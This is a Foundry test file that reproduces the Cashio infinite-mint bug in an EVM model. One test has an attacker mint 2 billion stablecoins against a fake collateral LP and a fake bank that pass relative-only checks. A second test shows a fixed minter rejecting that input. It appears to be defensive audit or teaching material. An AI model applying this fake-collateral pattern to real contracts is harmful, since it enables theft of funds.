// SPDX-License-Identifier: MIT
pragma solidity ^0.8.20;

import {Test, console2} from "forge-std/Test.sol";
import {MinterBase, VulnerableMinter, SafeMinter, IERC20Mintable, ICollateralLP} from "../src/cashio/Minter.sol";

/// PoC for the Cashio infinite-mint (2022-03-23, $52.8M).
///   forge test --match-contract CashioInfiniteMint -vvv
///
/// EVM model of a Solana account-validation bug. Invariant that SHOULD hold
/// (master-checklist SC05): every minted stablecoin unit is backed by collateral whose
/// mint is a known, trusted token. The attack breaks it: a parallel tree of fake
/// accounts passes every *relative* check, so worthless collateral mints unlimited CASH.
///
/// See docs/exploits/cashio-infinite-mint-2022-03-23.md

/// The protocol stablecoin — anyone holding the minter can mint (the minter IS the auth).
contract CASH is IERC20Mintable {
    string public name = "Cashio USD";
    mapping(address => uint256) public balanceOf;
    uint256 public totalSupply;

    function mint(address to, uint256 amount) external {
        balanceOf[to] += amount;
        totalSupply += amount;
    }

    function transferFrom(address from, address to, uint256 amount) external returns (bool) {
        balanceOf[from] -= amount;
        balanceOf[to] += amount;
        return true;
    }
}

/// A collateral LP that self-reports its `bank`. The real one points at the real bank;
/// the attacker's fake points at a fake bank they also control — both pass the relative
/// `lp.bank() == bank` check.
contract FakeLP is ICollateralLP {
    address public bank;

    constructor(address _bank) {
        bank = _bank;
    }

    // Worthless: "transferring" it costs the attacker nothing.
    function transferFrom(address, address, uint256) external pure returns (bool) {
        return true;
    }
}

contract CashioInfiniteMintTest is Test {
    CASH cash;
    address attacker = makeAddr("attacker");

    function setUp() public {
        cash = new CASH();
    }

    function test_vulnerableMinter_infiniteMint() public {
        VulnerableMinter minter = new VulnerableMinter(cash);

        // Attacker builds a parallel tree of fakes: a fake bank + a fake LP pointing at it.
        address fakeBank = makeAddr("fakeBank");
        FakeLP fakeLP = new FakeLP(fakeBank);

        vm.prank(attacker);
        minter.mint(fakeLP, fakeBank, 2_000_000_000e18); // 2B CASH from nothing

        uint256 minted = cash.balanceOf(attacker);
        console2.log("CASH minted from worthless collateral:", minted / 1e18);
        assertEq(minted, 2_000_000_000e18, "attacker minted 2B CASH backed by nothing");
    }

    function test_safeMinter_rejectsFakeCollateral() public {
        // The one real, trusted collateral LP.
        FakeLP realLP = new FakeLP(makeAddr("realBank"));
        SafeMinter minter = new SafeMinter(cash, realLP);

        address fakeBank = makeAddr("fakeBank");
        FakeLP fakeLP = new FakeLP(fakeBank);

        // Relative checks still pass, but the mint is anchored to the trusted LP.
        vm.prank(attacker);
        vm.expectRevert(bytes("untrusted collateral mint"));
        minter.mint(fakeLP, fakeBank, 2_000_000_000e18);

        assertEq(cash.balanceOf(attacker), 0, "no CASH minted from fake collateral");
    }
}
